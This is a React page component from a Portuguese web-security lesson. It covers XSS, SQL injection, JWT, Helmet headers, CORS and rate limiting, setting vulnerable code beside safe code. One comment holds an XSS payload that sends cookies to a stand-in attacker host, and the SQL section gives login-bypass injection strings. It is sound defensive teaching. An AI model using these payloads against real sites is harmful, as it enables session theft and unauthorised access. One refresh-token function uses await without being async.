import SectionHeader from '../components/SectionHeader';
import TopicCard from '../components/TopicCard';
import Diagram from '../components/Diagram';
import CodeBlock from '../components/CodeBlock';

export default function Section46() {
  return (
    <div>
      <SectionHeader number={46} title='Seguranca Web' subtitle='XSS, CSRF, SQL Injection, JWT, HTTPS e cabecalhos de seguranca' />

      <Diagram title='As Principais Ameacas Web'>
{`OWASP TOP 10 (resumo das mais comuns):

  USUARIO          REDE             SERVIDOR
     |               |                  |
     |   XSS <-------+                  |
     |   (script injetado               |
     |    roda no browser               |
     |    do usuario)                   |
     |                                  |
     |   CSRF <------+                  |
     |   (usuario logado faz            |
     |    acao involuntaria)            |
     |                                  |
     |                  SQL Injection --+
     |                  (query SQL      |
     |                   manipulada)    |
     |                                  |
     |                  Auth Broken  ---+
     |                  (token fraco,   |
     |                   sem expirar)   |
     |                                  |
     |                  SSRF -----------+
     |                  (servidor faz   |
     |                   requests       |
     |                   internos)      |

REGRA DE OURO:
  Nao confie em NENHUMA entrada externa
  Valide no backend (frontend bypass e trivial)
  Principio do menor privilegio em tudo`}
      </Diagram>

      <TopicCard
        title='XSS — Cross-Site Scripting'
        definition='XSS acontece quando um atacante injeta codigo JavaScript malicioso que e executado no browser de outros usuarios. Pode roubar cookies de sessao, redirecionar para sites falsos ou capturar dados digitados. E a vulnerabilidade mais comum na web.'
        whenToUse={['Sempre sanitizar input do usuario antes de renderizar como HTML', 'Usar Content Security Policy (CSP) para limitar scripts', 'Marcar cookies como HttpOnly para impedir acesso via JS', 'Usar frameworks que escapam HTML automaticamente (React faz isso)']}
        whenNotToUse={['Nunca usar dangerouslySetInnerHTML com conteudo de usuario sem sanitizacao', 'Nunca concatenar input do usuario em innerHTML', 'Nunca confiar em validacao somente no frontend']}
        code={`// VULNERAVEL (nunca faca isso)
const comentario = req.body.comentario
// Atacante envia: <script>fetch('https://evil.com?c='+document.cookie)</script>
document.getElementById('comentarios').innerHTML = comentario
// Resultado: cookie do usuario roubado

// SEGURO - Option 1: Usar biblioteca de sanitizacao
import DOMPurify from 'dompurify'   // browser
import sanitizeHtml from 'sanitize-html'  // Node.js

// Permite apenas formatacao segura, remove scripts
const conteudoLimpo = sanitizeHtml(req.body.htmlContent, {
  allowedTags: ['b', 'i', 'em', 'strong', 'p', 'br'],
  allowedAttributes: {}   // sem href (evita javascript:)
})

// SEGURO - Option 2: textContent em vez de innerHTML
element.textContent = comentarioDoUsuario    // nunca executa script

// SEGURO - React escapa automaticamente (nao usar dangerouslySetInnerHTML)
// Isso e seguro no React:
return <div>{comentarioDoUsuario}</div>
// Isso e PERIGOSO:
return <div dangerouslySetInnerHTML={{ __html: comentarioDoUsuario }} />

// Content Security Policy no Express (com helmet)
import helmet from 'helmet'
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],        // so scripts do proprio dominio
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'", "https://api.meusite.com"],
    fontSrc: ["'self'", "https://fonts.gstatic.com"],
    objectSrc: ["'none'"],
    frameSrc: ["'none'"],
  },
}))

// Cookie seguro — inacessivel via JavaScript
res.cookie('sessionId', token, {
  httpOnly: true,      // XSS nao consegue ler
  secure: true,        // so HTTPS
  sameSite: 'strict',  // protege contra CSRF
  maxAge: 7 * 24 * 60 * 60 * 1000  // 7 dias em ms
})`}
        result={`Atacante envia: <script>alert('XSS')</script>
Sem protecao: script executa no browser da vitima
Com sanitizacao: texto exibido literalmente, sem execucao
Com CSP: mesmo que passe, browser bloqueia execucao`}
        errors={['dangerouslySetInnerHTML com input de usuario — maior causa de XSS em React', 'v-html no Vue com conteudo nao sanitizado — mesma vulnerabilidade', 'eval() com dados externos — executa codigo arbitrario']}
        tips={['React e Vue ja escapam HTML por padrao — e seguro renderizar {variavel}', 'DOMPurify e a biblioteca mais confiavel para sanitizar HTML rico', 'CSP como segunda linha de defesa — mesmo se XSS passar, o browser bloqueia', 'httpOnly cookie impossibilita roubo via XSS']}
        checklist={['Nunca usar innerHTML/dangerouslySetInnerHTML com input de usuario?', 'Sanitize-html ou DOMPurify em uso onde HTML e necessario?', 'CSP configurado?', 'Cookies com httpOnly e secure?']}
      >
        <p className='text-sm text-gray-600'>Analogia: XSS e como alguem deixar uma nota numa parede publica que diz "repita isso em voz alta para todos" — e os visitantes, sem saber, executam a instrucao do atacante. A sanitizacao e como ter um guarda que le a nota primeiro e remove as partes maliciosas.</p>
      </TopicCard>

      <TopicCard
        title='SQL Injection — Protegendo o Banco'
        definition='SQL Injection e quando um atacante manipula uma query SQL injetando codigo malicioso atraves de campos de formulario ou parametros de URL. Pode vazar todos os dados, deletar tabelas, ou dar acesso total ao banco. E completamente evitavel com queries parametrizadas.'
        whenToUse={['Sempre use queries parametrizadas (prepared statements)', 'Use um ORM como Prisma ou TypeORM — ja parametriza automaticamente', 'Valide e sanitize todos os inputs antes da query', 'Use principio de menor privilegio no usuario do banco']}
        whenNotToUse={['Nunca concatene strings para montar SQL com input de usuario', 'Nunca confie em validacao de tipo do frontend']}
        code={`// VULNERAVEL — NUNCA FACA ISSO
const { email, senha } = req.body
const query = \`SELECT * FROM usuarios WHERE email = '\${email}' AND senha = '\${senha}'\`
// Atacante envia:  email = admin@site.com' --
// Query vira:      SELECT * FROM usuarios WHERE email = 'admin@site.com' --'  AND senha = '...'
// O -- comenta o resto — login sem senha!

// SEGURO — Queries parametrizadas (pg client)
import { Pool } from 'pg'
const pool = new Pool()

// Parametros sao passados separados da query (nunca concatenados)
const result = await pool.query(
  'SELECT * FROM usuarios WHERE email = $1 AND senha_hash = $2',
  [email, senhaHash]   // driver cuida do escaping
)

// SEGURO — Prisma (ORM que parametriza automaticamente)
const usuario = await prisma.usuario.findFirst({
  where: {
    email: email,        // Prisma nao permite injecao aqui
    senhaHash: senhaHash
  }
})

// Cuidado com $queryRaw no Prisma (consulta SQL crua):
// VULNERAVEL:
const resultado = await prisma.$queryRawUnsafe(
  \`SELECT * FROM logs WHERE userId = \${userId}\`
)

// SEGURO:
const resultado = await prisma.$queryRaw\`
  SELECT * FROM logs WHERE userId = \${userId}
\`  // template literal com prisma.$queryRaw usa parametros automaticamente

// Validacao de input com zod
import { z } from 'zod'
const loginSchema = z.object({
  email: z.string().email().max(255),
  senha: z.string().min(8).max(128)
})

app.post('/login', (req, res) => {
  const result = loginSchema.safeParse(req.body)
  if (!result.success) {
    return res.status(400).json({ erro: 'Dados invalidos' })
  }
  // Agora os dados sao validados e tipados
  const { email, senha } = result.data
})`}
        result={`Atacante envia: email = admin@site.com' OR '1'='1
Com concatenacao: query retorna TODOS os usuarios
Com parametros:   query retorna 0 resultados (string literal)`}
        errors={['$queryRawUnsafe com input de usuario — usa SQL cru sem protecao', 'Prisma.$queryRaw com interpolacao de string em vez de template literal', 'Erro detalhado de SQL exposto na resposta (revela estrutura do banco)']}
        tips={['Nunca mostre erro de SQL real para o usuario — log interno + mensagem generica', 'Usuario do banco com permissoes minimas (so SELECT no banco de leitura)', 'Prisma e TypeORM protegem por padrao — cuidado com as funcoes *Raw', 'Auditoria: procure por queryRawUnsafe e concatenacao com req.body no codigo']}
        checklist={['Zero concatenacao de strings de usuario em queries SQL?', 'ORM ou prepared statements em todos os acessos ao banco?', 'Erros SQL nao expostos ao usuario?', 'Usuario do banco com permissoes minimas?']}
      >
        <p className='text-sm text-gray-600'>Analogia: SQL Injection e como alguem preencher um formulario de busca com "fechar aspas e adicionar outra instrucao". Prepared statements e como ter uma caixa de texto que aceita apenas texto puro — qualquer aspas ou SQL e tratado como texto, nao como instrucao.</p>
      </TopicCard>

      <CodeBlock
        title='JWT — Autenticacao com Tokens'
        language='typescript'
        code={`// JWT: JSON Web Token
// Estrutura: Header.Payload.Signature
// eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEyfQ.abc123

// BOAS PRATICAS com JWT

import jwt from 'jsonwebtoken'
import { env } from './config'

// 1. Assinar token (no login)
function gerarToken(userId: number) {
  return jwt.sign(
    { userId, iat: Date.now() },     // payload
    env.JWT_SECRET,                  // segredo (minimo 32 chars)
    {
      expiresIn: '15m',              // access token curto (15 min)
      algorithm: 'HS256'
    }
  )
}

// 2. Refresh token (vida longa, guardado no banco)
function gerarRefreshToken(userId: number) {
  const token = jwt.sign(
    { userId, type: 'refresh' },
    env.JWT_REFRESH_SECRET,
    { expiresIn: '7d' }
  )
  // Salvar no banco para poder invalidar
  await prisma.refreshToken.create({
    data: { token, userId, expiresAt: new Date(Date.now() + 7*24*60*60*1000) }
  })
  return token
}

// 3. Verificar token (middleware)
function authMiddleware(req, res, next) {
  const authHeader = req.headers.authorization
  if (!authHeader?.startsWith('Bearer ')) {
    return res.status(401).json({ erro: 'Token nao fornecido' })
  }

  const token = authHeader.slice(7)
  try {
    const payload = jwt.verify(token, env.JWT_SECRET) as { userId: number }
    req.userId = payload.userId
    next()
  } catch (err) {
    if (err instanceof jwt.TokenExpiredError) {
      return res.status(401).json({ erro: 'Token expirado', code: 'TOKEN_EXPIRED' })
    }
    return res.status(401).json({ erro: 'Token invalido' })
  }
}

// 4. Onde guardar o token no cliente?
// RUIM: localStorage — vulneravel a XSS (JS consegue ler)
// BOM:  Cookie httpOnly — inacessivel por JavaScript
//       Memory (variavel JS) — se perde no reload, precisa de refresh token

// 5. Logout — invalidar refresh token no banco
async function logout(refreshToken: string) {
  await prisma.refreshToken.delete({
    where: { token: refreshToken }
  })
  // Access token expira sozinho (por isso deve ser curto)
}

// 6. NUNCA faca:
// jwt.decode(token) para verificar autenticidade — so decodifica, NAO valida assinatura
// JWT_SECRET = "123" — use openssl rand -base64 32 para gerar`}
      />

      <TopicCard
        title='Helmet.js e Cabecalhos de Seguranca'
        definition='Cabecalhos HTTP de seguranca instruem o browser a se proteger contra varios tipos de ataques. O Helmet.js configura os principais automaticamente para aplicacoes Express. Sao linhas de defesa adicionais que complementam a validacao de input.'
        whenToUse={['app.use(helmet()) em toda aplicacao Express/Fastify', 'Content-Security-Policy para limitar origens de recursos', 'HSTS para forcar HTTPS', 'Rate limiting para prevenir brute force e DDoS']}
        whenNotToUse={['Nao confiar SOMENTE em cabecalhos — sao defesa em profundidade', 'Nao desabilitar cabecalhos de seguranca por simplicidade']}
        code={`import helmet from 'helmet'
import rateLimit from 'express-rate-limit'
import cors from 'cors'

const app = express()

// 1. Helmet — configura varios cabecalhos de seguranca
app.use(helmet())
// Define automaticamente:
// X-Content-Type-Options: nosniff
// X-Frame-Options: DENY (protege contra clickjacking)
// X-XSS-Protection: 0 (CSP e melhor)
// Strict-Transport-Security (HSTS): max-age=15552000
// Referrer-Policy: no-referrer

// 2. CORS — controlar quem pode chamar sua API
app.use(cors({
  origin: ['https://meusite.com', 'https://www.meusite.com'],
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  credentials: true,    // permite enviar cookies entre origens
  optionsSuccessStatus: 200
}))
// NUNCA: origin: '*' com credentials: true (vulnerabilidade de CORS)

// 3. Rate Limiting — previne brute force e DDoS
const limiterGeral = rateLimit({
  windowMs: 60 * 1000,   // 1 minuto
  max: 100,              // max 100 requests por minuto por IP
  standardHeaders: true,
  legacyHeaders: false,
  message: { erro: 'Muitas requisicoes, tente em 1 minuto' }
})

const limiterLogin = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutos
  max: 5,                    // max 5 tentativas de login
  message: { erro: 'Muitas tentativas, aguarde 15 minutos' }
})

app.use(limiterGeral)
app.use('/auth/login', limiterLogin)

// 4. Validar e limitar tamanho do body (previne ataques de payload gigante)
app.use(express.json({ limit: '100kb' }))
app.use(express.urlencoded({ extended: true, limit: '100kb' }))

// Resultado dos cabecalhos retornados:
// strict-transport-security: max-age=15552000; includeSubDomains
// content-security-policy: default-src 'self'; ...
// x-frame-options: SAMEORIGIN
// x-content-type-options: nosniff`}
        result={`sem helmet: nenhum cabecalho de seguranca
com helmet: 12 cabecalhos protetores configurados

Brute force sem rate limit: 10.000 tentativas/min
Brute force com rate limit: bloqueado apos 5 tentativas`}
        errors={['CORS origin: * com cookies — permite qualquer site ler suas respostas autenticadas', 'Rate limit muito permissivo — aumente restricao em endpoints sensiveis (login, reset-senha)', 'HSTS sem HTTPS configurado — usuarios ficam bloqueados do site']}
        tips={['npm install helmet cors express-rate-limit — as tres libs fundamentais', 'securityheaders.com — analisa os cabecalhos de seguranca do seu site', 'Bcrypt para senhas: bcrypt.hash(senha, 12) — nunca guardar senha em texto plano', 'OWASP Cheat Sheet Series: guia completo e gratuito de seguranca web']}
        checklist={['Helmet configurado?', 'CORS restrito aos dominios certos?', 'Rate limiting nos endpoints sensiveis?', 'JWT com segredo forte e expiracao curta?', 'Senhas com bcrypt (nunca plain text ou MD5)?', 'Variaveis de ambiente validadas na inicializacao?']}
      >
        <p className='text-sm text-gray-600'>Analogia: Cabecalhos de seguranca sao como a portaria de um predio — nao resolvem tudo, mas filtram o que passa. O rate limiter e o porteiro que para quem esta batendo na campainha 100 vezes por minuto. O CORS e o controle de visitantes autorizados. Juntos, criam camadas de defesa.</p>
      </TopicCard>
    </div>
  );
}
